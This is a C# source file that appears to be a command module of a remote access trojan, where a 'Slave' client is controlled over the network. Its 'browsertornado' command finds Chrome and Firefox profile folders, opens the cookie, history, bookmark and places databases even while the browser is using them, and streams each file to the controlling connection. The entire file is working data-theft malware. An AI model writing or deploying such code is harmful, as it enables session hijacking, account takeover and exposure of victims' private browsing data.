using System;
using System.Collections.Generic;
using System.IO;
using Shared;

namespace Slave.Commands
{
    internal class BrowserTornado : ICommand
    {
        public string name { get; } = "browsertornado";


        public void Process(List<string> args)
        {
            var chromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"..\Local\Google\Chrome\User Data\Default");

            var firefoxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Mozilla\Firefox\Profiles");

            if (Directory.Exists(chromePath))
            {
                GlobalCommandsManager.networkManager.WriteLine("chrome|OK");
                FindAndSendFile(chromePath, "Cookies");
                FindAndSendFile(chromePath, "History");
                FindAndSendFile(chromePath, "Bookmarks");
            }
            else
            {
                GlobalCommandsManager.networkManager.WriteLine("chrome|KO");
            }

            if (Directory.Exists(firefoxPath))
            {
                GlobalCommandsManager.networkManager.WriteLine("firefox|OK");
                firefoxPath = Path.Combine(Directory.GetDirectories(firefoxPath)[0]);
                FindAndSendFile(firefoxPath, "cookies.sqlite");
                FindAndSendFile(firefoxPath, "places.sqlite");
            }
            else
            {
                GlobalCommandsManager.networkManager.WriteLine("firefox|KO");
            }
        }

        void FindAndSendFile(string path, string filename)
        {
            var filepath = Path.Combine(path, filename);
            if (File.Exists(filepath))
            {
                // Open the file and avoid exception if it is in use
                try
                {
                    using (var fs = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        GlobalCommandsManager.networkManager.WriteLine($"{filename}|OK");
                        GlobalCommandsManager.networkManager.StreamToNetworkStream(fs);
                    }
                }
                catch (IOException)
                {
                    // Ignored, will send the error message below
                }
            }

            GlobalCommandsManager.networkManager.WriteLine($"{filename}|KO");
        }
    }
}
